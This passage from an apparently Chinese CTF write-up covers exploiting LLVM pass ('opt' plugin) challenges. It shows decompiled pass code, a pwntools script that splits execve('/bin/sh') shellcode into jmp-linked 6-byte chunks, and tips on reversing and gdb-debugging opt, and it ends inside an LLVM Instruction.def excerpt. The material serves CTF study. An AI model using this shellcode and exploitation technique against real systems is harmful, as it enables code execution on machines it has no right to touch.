__fastcall `anonymous namespace<span class="number">&#x27;</span>::MBAPass::callCode(</span><br><span class="line">        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),</span><br><span class="line">        __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> this[<span class="number">4</span>]((_anonymous_namespace_::MBAPass *)this, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先将<code>this[4]</code>页置为可写可执行,执行handler函数</p><p>再将<code>this[4]</code>页置为可读可执行,执行<code>this[4]</code>处的代码</p><p>经过调试可以知道this[4]被全部初始化为c3</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_212830.png" alt=""></p><p>那么重点就是handle了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v29 = (llvm::BasicBlock *)llvm::Function::front(a2);</span><br><span class="line">Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);</span><br><span class="line">Operand = llvm::User::getOperand(Terminator, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);</span><br><span class="line">  SExtValue = llvm::ConstantInt::getSExtValue(v2);</span><br><span class="line">  `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="number">0</span>, SExtValue);</span><br><span class="line">  <span class="keyword">return</span> `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeRet(this);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)this + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">  `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeMovImm64(this, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> `anonymous namespace<span class="number">&#x27;</span>::MBAPass::writeRet(this);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题是倒序对基本块中的指令进行处理的，<code>getTerminator</code>函数是取末尾的指令，第一个<code>if</code>判断末尾指令的第一个操作数是否是常数，第二个<code>else if</code>判断末尾指令的第一个操作数是否为函数的参数，如果都不是，说明是变量，那就进入到最后<code>else</code>的分支。</p><p>出题人实现了四个函数用于写指令</p><ul><li>writeMovImm64 给rax或rbx立即数</li><li>writeInc <code>inc rax</code></li><li>writeOpReg <code>add rax,rbx</code></li><li>writeRet 写<code>ret</code></li></ul><p>但这些shellcode似乎并没办法能够构造完成getshell</p><p>所以这题最后利用的是反复执行RunOnFunction的时候,<u>this[4]的内容是不会被重置的</u></p><p>因为其是在构造函数中进行初始化的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall `anonymous namespace<span class="number">&#x27;</span>::MBAPass::MBAPass(<span class="type">void</span> **this)</span><br><span class="line">&#123;</span><br><span class="line">  llvm::FunctionPass::FunctionPass((llvm::FunctionPass *)this, `anonymous namespace<span class="number">&#x27;</span>::MBAPass::ID);</span><br><span class="line">  *this = (<span class="type">char</span> *)&amp;`vtable <span class="keyword">for</span><span class="number">&#x27;</span>`anonymous namespace<span class="number">&#x27;</span>::MBAPass + <span class="number">16</span>;</span><br><span class="line">  this[<span class="number">4</span>] = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(this[<span class="number">4</span>], <span class="number">195</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析发现，<u>一个<code>sub</code>或者<code>add</code>的<code>IR</code>对应的<code>shellcode</code>是13个字节</u>：,那么我们可以这样构造</p><p>第一次利用add rax功能在这个区域留下一些jmp指令</p><p>然后第二次输入shellcode恰好覆盖到执行jmp指令,并且在第二次输入shellcode的时候提前利用add rax功能<u>分多次布置好shellcode并使用jmp跳转指令连接</u></p><p>最后由于这题的<code>LLVM IR</code>中指令的操作符只能是<code>add</code>或<code>sub</code>，故不能用<code>C</code>语言直接编译生成<code>LLVM IR</code>文件，不然会有很多其他的操作符。</p><p><u>可以先用<code>C</code>语言写两个空函数</u>，再通过<code>clang-12</code>对其编译生成<code>ll</code>文件，<u>然后直接在<code>ll</code>文件中仿照之前的题目手写<code>LLVM IR</code></u></p><p><strong>模板脚本:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">319</span>):</span><br><span class="line">payload = <span class="string">&quot;  %&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; = add nsw i64 %&quot;</span> + <span class="built_in">str</span>(i-<span class="number">1</span>) + <span class="string">&quot;, &quot;</span> + <span class="string">&quot;1024&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p><strong>shellcode:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = [</span><br><span class="line"><span class="string">&quot;mov edi, 0x68732f6e&quot;</span>,<span class="comment">#为了长度不长于6,所以选择/bin/sh分两次写</span></span><br><span class="line"><span class="string">&quot;shl rdi, 24&quot;</span>,<span class="comment">#左移三个字节</span></span><br><span class="line"><span class="string">&quot;mov ebx, 0x69622f&quot;</span>,</span><br><span class="line"><span class="string">&quot;add rdi, rbx&quot;</span>,<span class="comment">#剩余部分,通过ebx加上</span></span><br><span class="line"><span class="string">&quot;push rdi&quot;</span>,</span><br><span class="line"><span class="string">&quot;push rsp&quot;</span>,</span><br><span class="line"><span class="string">&quot;pop rdi&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor rsi, rsi&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor rdx, rdx&quot;</span>,</span><br><span class="line"><span class="string">&quot;push 59&quot;</span>,</span><br><span class="line"><span class="string">&quot;pop rax&quot;</span>,</span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sc <span class="keyword">in</span> shellcode:</span><br><span class="line"><span class="built_in">print</span>(u64(asm(sc).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + <span class="string">b&#x27;\xEB\xEB&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(u16(<span class="string">b&#x27;\xEB\xE4&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="逆向定位"><a href="#逆向定位" class="headerlink" title="逆向定位"></a>逆向定位</h2><p>一般情况下,ctf中llvm类题目都是重写了<code>FunctionPass</code>类中的<code>runOnFunction</code>函数</p><p>那么该如何定位到重写的<code>runOnFunction</code>函数</p><p>只需要打开so文件,在ida中搜索文本<code>vtable</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000000000020DD10                               ; `vtable for&#x27;`anonymous namespace&#x27;::VMPass</span><br><span class="line">LOAD:000000000020DD10 00 00 00 00 00 00 00 00       _ZTVN12_GLOBAL__N_16VMPassE dq 0        ; offset to this</span><br><span class="line">LOAD:000000000020DD18 B0 DD 20 00 00 00 00 00       dq offset _ZTIN12_GLOBAL__N_16VMPassE   ; `typeinfo for&#x27;`anonymous namespace&#x27;::VMPass</span><br><span class="line">LOAD:000000000020DD20 80 67 00 00 00 00 00 00       off_20DD20 dq offset sub_6780           ; DATA XREF: sub_6720+30↑o</span><br><span class="line">LOAD:000000000020DD28 D0 67 00 00 00 00 00 00       dq offset sub_67D0</span><br><span class="line">LOAD:000000000020DD30 E0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(void)</span><br><span class="line">LOAD:000000000020DD38 30 7A 00 00 00 00 00 00       dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;)</span><br><span class="line">LOAD:000000000020DD40 80 7A 00 00 00 00 00 00       dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;)</span><br><span class="line">LOAD:000000000020DD48 80 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module const*)</span><br><span class="line">LOAD:000000000020DD50 08 EB 20 00 00 00 00 00       dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,std::string const&amp;)</span><br><span class="line">LOAD:000000000020DD58 F0 EA 20 00 00 00 00 00       dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType)</span><br><span class="line">LOAD:000000000020DD60 C0 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;)</span><br><span class="line">LOAD:000000000020DD68 B0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(void)</span><br><span class="line">LOAD:000000000020DD70 D8 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;)</span><br><span class="line">LOAD:000000000020DD78 00 EB 20 00 00 00 00 00       dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(void)</span><br><span class="line">LOAD:000000000020DD80 A0 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(void const*)</span><br><span class="line">LOAD:000000000020DD88 78 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(void)</span><br><span class="line">LOAD:000000000020DD90 C8 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(void)</span><br><span class="line">LOAD:000000000020DD98 D0 EA 20 00 00 00 00 00       dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(void)</span><br><span class="line">LOAD:000000000020DDA0 98 EA 20 00 00 00 00 00       dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class="line">LOAD:000000000020DDA8 30 68 00 00 00 00 00 00       dq offset sub_6830</span><br><span class="line">LOAD:000000000020DDB0                               ; public `anonymous namespace&#x27;::VMPass</span><br></pre></td></tr></table></figure><p>一般最后一项就是重写的<code>runOnFunction</code>函数</p><p>至于<code>PASS</code>注册的名称，一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  sub_6510((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>一般调试对象都是题目给定的opt,调试的步骤一般是</p><p><code>gdb ./opt-8</code>进入调试</p><p>之后<code>set args -load ./VMPass.so -VMPass ./exp.ll</code>配置参数</p><p><code>opt</code>会在一系列初始化函数(<u>gdb调试非常明显的一大坨</u>)之后的第一个call映射so共享模块</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_110404.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff3b5d000     0x7ffff3b6b000 r-xp     e000      0 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3b6b000     0x7ffff3d6a000 ---p   1ff000   e000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3d6a000     0x7ffff3d6b000 r--p     1000   d000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3d6b000     0x7ffff3d6c000 rw-p     1000   e000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br></pre></td></tr></table></figure><p>在第一个地址起始处加上so中的偏移便能够下断点进行调试了</p><p><code>opt</code>是在<code>llvm::legacy::PassManager::run(llvm::Module&amp;)</code>处开始进行对<code>RunonFunction</code>的调用</p><p>然后在其内部这个位置进入<code>llvm::FPPassManager::runOnModule(llvm::Module&amp;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111145.png" alt=""></p><p>之后便正式进入<code>llvm::FPPassManager::runOnFunction(llvm::Function&amp;)</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111312.png" alt=""></p><p>最后调用重写的<code>RunOnFunction</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111441.png" alt=""></p><h2 id="opt"><a href="#opt" class="headerlink" title="opt"></a>opt</h2><p>llvm_pass类题目其其实就是针对<code>opt</code>这个文件</p><p>利用so模块中注册的PASS类中的漏洞去pwn攻击<code>opt进程</code></p><p>opt的保护一般都是这种情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/aichch/pwn/qwb2022-yakagame/opt-8&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//===-- llvm/Instruction.def - File that describes Instructions -*- C++ -*-===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                     The LLVM Compiler Infrastructure</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file is distributed under the University of Illinois Open Source</span></span><br><span class="line"><span class="comment">// License. See LICENSE.TXT for details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file contains descriptions of the various LLVM instructions.  This is</span></span><br><span class="line"><span class="comment">// used as a central place for enumerating the different instructions and</span></span><br><span class="line"><span class="comment">// should eventually be the place to put comments about the instructions.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> NO INCLUDE GUARD DESIRED!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Provide definitions of macros so that users of this file do not have to</span></span><br><span class="line"><span class="comment">// define everything to use it...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_TERM_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_TERM_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_UNARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_UNARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_BINARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_BINARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span 